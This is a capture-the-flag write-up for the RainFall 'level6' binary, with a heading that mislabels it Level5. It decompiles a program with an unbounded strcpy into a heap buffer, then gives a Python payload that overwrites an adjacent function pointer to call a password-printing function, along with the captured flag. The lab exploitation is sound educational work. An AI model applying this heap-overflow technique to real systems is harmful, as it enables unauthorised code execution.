# Level5

## Intro

In this level we have a binary `level6`. When we execute it without arguments, a segfault appen
```bash
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
```

But when we run it with a argument we have a message `Nope`:
```bash
level6@RainFall:~$ ./level6 ddfg 
Nope
level6@RainFall:~$ ./level6 ddfg fghfg
Nope
level6@RainFall:~$ ./level6 ddfg fghfg uyui
Nope
```

## Analyse
Now let analyse the code,
```c
void main(undefined4 param_1,int param_2)

{
  char *__dest;
  code **ppcVar1;
  
  __dest = (char *)malloc(0x40);
  ppcVar1 = (code **)malloc(4);
  *ppcVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (**ppcVar1)();
  return;
}
```
```c
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)

{
  puts("Nope");
  return;
}
```
```c
void n(void)

{
  system("/bin/cat /home/user/level7/.pass");
  return;
}
```
## Explanation
As we can see we have the main, this main we have 2 allocation with malloc.
The first one with 0x40 = 64 bytes, and the second one of 4 bytes. Then we add the function `m` to ppcVar1[1], after that we have a strcpy to copy the content of `(char **)(param_2 +4)` (it can be interpret by `param_2[1]`) in __dest. But when we read the man of strcpy we see this

```
BUGS:
If the destination string of a strcpy() is not large enough, then anything might happen.  Overflowing fixed-length string buffers is a favorite cracker technique for tak‐
ing complete control of the machine.  Any time a program reads or copies data into a buffer, the program first needs to check that there's enough space.  This may be  un‐
necessary if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make the impossible possible.
```
That mean we there is a vulnerability in strcpy that we can exploit.

We have to overflow the `__dest` and that will cause a segfault at the strcpy function and allow us to acces to the next address, and the next address is `  (**ppcVar1)();` and the goal is to replace this one by `n()`

## Retrieving the Next Level Password

After find the addresse of `n()` = `0x08048454`, we now know, we create a python script
```python
import struct

my_var = b"A" * 72 
my_var += struct.pack("<I", 0x08048454) #addr of n()
print(my_var)
```

Now we just have to run the binary with this script:
```bash
level6@RainFall:~$ ./level6 $(python /tmp/solve.py)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

That print our flag:
`f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`